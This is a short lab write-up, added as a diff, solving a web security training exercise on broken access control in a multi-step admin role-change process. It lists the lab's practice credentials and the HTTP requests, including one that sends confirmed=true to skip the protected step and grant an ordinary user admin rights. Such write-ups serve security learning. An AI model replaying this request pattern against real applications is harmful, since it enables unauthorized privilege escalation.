@@ -1,0 +1,27 @@
+Lab: Multi-step process with no access control on one step
+
+Vulnerability: This lab has an admin panel with a flawed multi-step process for changing a user's role. You can familiarize yourself with the admin panel by logging in using the credentials administrator:admin
+
+Goal: To solve the lab, log in using the credentials wiener:peter and exploit the flawed access controls to promote yourself to become an administrator.
+
+Analysis and Solution:
+1. Log in with credentials administrator:admin, and upgrade the role of carlos
+=> See the process upgrading the role of carlos contains 2 steps:
++ When click upgrade, a request is sent: 
+    POST /admin-roles HTTP/2
+    username=carlos&action=upgrade
++ When confirm, another request is sent: 
+    POST /admin-roles HTTP/2
+    action=upgrade&confirmed=true&username=carlos
+=> It is quite similar to the first request, but it contains confirmed=true 
+
+2. Log in with credentials wiener:peter
++ First, try making a request:
+    POST /admin-roles HTTP/2
+    username=wiener&action=upgrade
+=> Receive an error: "Unauthorized"
++ Second, try making a request: 
+    POST /admin-roles HTTP/2
+    action=upgrade&confirmed=true&username=wiener
+=> SUCCESSFULLY
+=> Deduce that the process upgrading roles of users contains 2 steps. Whereas access control is applied to the first step, but no to the second step.
